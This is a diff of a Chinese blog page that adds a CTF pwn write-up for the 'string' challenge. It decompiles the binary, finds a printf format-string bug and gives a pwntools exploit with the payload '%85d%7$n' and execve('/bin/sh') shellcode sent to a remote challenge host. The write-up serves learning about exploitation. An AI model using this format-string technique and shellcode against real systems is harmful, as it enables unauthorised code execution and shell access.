@@ -458,14 +458,14 @@ CGfsb菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作�
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.5k
+                    4.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    13 分
+                    18 分
                 </div>
                 
                 
@@ -869,6 +869,185 @@ io<span class="token punctuation">.</span>close<span class="token punctuation">(
 <li><p>总结吧，又有了新的收获，strlen函数的溢出漏洞可以用来突破字符个数的限制以执行下面的程序，从而对下面的程序进行别的溢出，例如函数栈的溢出，构造伪栈帧等。</p>
 </li>
 </ul>
+<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p><code>菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求</code></p>
+<ul>
+<li><p>基操</p>
+<ul>
+<li><p>查看文件基本信息：64位文件，PIE没有打开，栈溢出检查开启了。</p>
+<p><img src="https://ae01.alicdn.com/kf/Hae4173d7d313410b98722cc91af55b59p.jpg" alt></p>
+</li>
+<li><p>运行一下看看</p>
+<p>是一个游戏，没啥内容，比较长懒得截图了。。。。。</p>
+</li>
+<li><p>丢到IDA看看</p>
+<ul>
+<li><p>先看到了main函数</p>
+<p><img src="https://ae01.alicdn.com/kf/H6fabf6af17184f6db0de96733d03087fE.jpg" alt></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>寻找flag的思路</p>
+<ul>
+<li><p>先调用用了sub_400996()这个函数，进去看看。</p>
+<pre class="line-numbers language-C"><code class="language-C">  unsigned __int64 sub_400996()
+  {
+    unsigned __int64 v0; // ST08_8
+
+    v0 = __readfsqword(0x28u);
+    puts("Welcome to Dragon Games!");
+    puts(off_603010);
+    return __readfsqword(0x28u) ^ v0;
+  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  没什么用，就输出了一句话</p>
+</li>
+<li><p>接着是给v3分配了8个字节的空间，又将v3赋值给了v4, 也就是v4其实就是v3了现在，*v3 = v3[0] = 68， v3[1] = 85, 下面由输出了v3的地址，莫名其面为什么要告诉我们v3的地址呢，肯定是要用到的。</p>
+</li>
+<li><p>主要的内容是在函数sub_400D72()中执行的，于是乎查看其中的内容</p>
+<pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400D72</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>
+    <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>
+
+    v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xC</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Creating a new player."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">sub_400A7D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">sub_400CA6</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hei! What's up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  执行了输入名字，接着对名字的长度进行了判断，长度小于0xC便进行 if 里面的操作，否则就结束了程序。if里面执行了三个函数，分别查看一下</p>
+</li>
+<li><p>sub_400A7D()</p>
+<pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+      <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"east"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"east"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+          <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hei! I'm secious!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So, where you will go?:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"east"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"up"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+          <span class="token function">sub_4009DD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"YOU KNOW WHAT YOU DO?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  输出了一堆东西，进入了一个判断循环，只有当我们输入了”east” 才给我们退出。</p>
+</li>
+<li><p>sub_400BB9()</p>
+<pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-7Ch]</span>
+    __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-78h]</span>
+    <span class="token keyword">char</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-70h]</span>
+    <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-8h]</span>
+
+    v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You travel a short distance east.That's odd, anyone disappear suddenly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">", what happend?! You just travel , and find another hole"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You recall, a big black hole will suckk you into it! Know what should you do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"A voice heard in your mind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your wish is"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I hear it, I hear it...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  只有我们输入了<code>1</code>才会执行 if 里面的语句，还有<code>printf(&amp;format, &amp;format)</code> 存在了一个明显的格式化字符串漏洞。暂且还不知道如何利用它，先放着</p>
+</li>
+<li><p>sub_400CA6()</p>
+<pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400CA6</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">void</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>
+    <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>
+
+    v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Dragon say: HaHa! you were supposed to have a normal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RPG game, but I have changed it! you have no weapon and "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"skill! you could not defeat me !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"That's sound terrible! you meet final boss!but you level is ONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>  发现了一个特别有用的东西</p>
+<blockquote>
+<p>  void (__fastcall <em>)(_QWORD, void </em>))v1)(0LL, v1);       </p>
+</blockquote>
+<p>  记住只要看见这样的句子，就知道是吧v1强制转化成一个函数指针，然后调用这个函数，那么我们就可以利用前面的read，把我们想要执行的命令(shellcode)写入到v1中，然后程序就可以执行shellcode。想要执行 if 里的语句我们就要让a1[0] = a1[1]， a1的根源就是v4，v4 = v3,  那么只要想办法让v3[0] = v3[1]  就行了，我们是知道v3的地址的，而且还有格式化字符串漏洞，那就要先看看v3的偏移量。</p>
+</li>
+<li><p>查看v3的偏移量</p>
+<p>  <img src="https://ae01.alicdn.com/kf/H13f6f7044a1f4113bd75c864d135fca2j.jpg" alt></p>
+<p>  12的16进制表示就是<code>c</code>，查一偏移量为7</p>
+</li>
+<li><p>于是乎我们只要构建payload = “%85d%7$n”, 首先先将v3的地址赋值给v2，然后再将利用格式化字符出漏洞将其赋值为85。</p>
+</li>
+</ul>
+</li>
+<li><p>构建exp</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">51451</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>
+addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#截取到返回的v3(v4)的地址。</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"nibaba"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"%85d%7$n"</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"I will help you! USE YOU SPELL"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># system("/bin/sh") 的shellcode编码就是 \x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li><p>运行结果，</p>
+<p><img src="https://ae01.alicdn.com/kf/H69c114b3ec204297859ef211c4361b273.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p>常见命令的shellcode编码可以从这个<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">数据库进行查询</a>。</p>
+</li>
+</ul>
+<blockquote>
+<p>搞了2个半小时,emmmm终于搞完了………………………….,   加油啊,啊啊啊啊啊啊啊…..</p>
+</blockquote>
 
             </div>
             <hr />
@@ -1344,7 +1523,7 @@ io<span class="token punctuation">.</span>close<span class="token punctuation">(
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">32k</span>
+            <span class="white-color">33.2k</span>
             
 
             <br>
